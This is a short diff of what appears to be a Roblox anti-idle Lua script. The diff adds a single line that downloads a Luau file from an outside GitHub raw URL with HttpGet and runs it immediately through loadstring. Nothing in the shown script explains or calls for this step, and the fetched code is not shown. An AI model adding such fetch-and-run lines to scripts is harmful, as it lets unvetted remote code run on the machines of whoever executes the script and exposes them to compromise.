@@ -4,6 +4,8 @@ if not game:IsLoaded() then
     print("Loaded Game")
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotHelkq/smth/refs/heads/main/wbh.luau"))()
+
 local Player = game:GetService("Players").LocalPlayer
 
 Player.Idled:connect(function()
